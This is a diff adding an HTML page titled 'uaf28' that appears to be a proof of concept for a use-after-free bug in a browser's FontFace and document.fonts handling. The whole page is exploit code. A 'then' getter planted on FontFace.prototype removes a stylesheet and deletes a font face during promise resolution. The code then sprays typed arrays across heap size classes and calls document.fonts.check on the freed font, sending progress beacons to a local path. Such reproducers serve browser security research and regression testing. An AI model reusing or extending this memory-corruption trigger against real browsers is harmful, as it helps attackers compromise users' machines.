@@ -1,0 +1,40 @@
+<!doctype html><meta charset="utf-8"><title>uaf28</title><body><script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+var styleEl=null, firedHere=false;
+function setup(){
+  var A=new FontFace('a0','local(Helvetica)',{unicodeRange:'U+0041'});
+  document.fonts.add(A); void A.loaded; window.__alive=[A];
+  styleEl=document.createElement('style');
+  styleEl.textContent="@font-face { font-family: b0; src: local(Arial); unicode-range: U+0042; }";
+  document.head.appendChild(styleEl);
+  b('U28-SETUP');
+  firedHere=false;
+  Object.defineProperty(FontFace.prototype,'then',{
+    configurable:true,
+    get:function(){
+      if (firedHere) return undefined;
+      firedHere=true;
+      if (styleEl) styleEl.remove();
+      try { document.fonts.delete(this); } catch(e){}
+      document.body.offsetHeight;
+      var CLASSES=[64,96,112,128,144,160,176,192,208,256];
+      window.__keep=[];
+      for (var c=0;c<CLASSES.length;c++){
+        var sz=CLASSES[c];
+        for (var k=0;k<8;k++) window.__keep.push(new Uint8Array(sz));
+        try { document.fonts.check('1em b0'); } catch(e){ b('U28-CHECK-THREW-'+sz); }
+        b('U28-SURVIVED-'+sz);
+      }
+      b('U28-ALL-CLASSES-DONE');
+      return undefined;
+    },
+    set:function(){}
+  });
+  b('U28-LOAD-CALLED');
+  document.fonts.load('1em a0, b0','AB').then(function(){ b('U28-RESOLVED'); }, function(){ b('U28-REJECTED'); });
+  setTimeout(function(){ b('U28-T400-ALIVE'); },400);
+}
+function run(){ b('U28-PARSE'); setup(); }
+if (document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
+else document.addEventListener('DOMContentLoaded',run);
+</script></body>
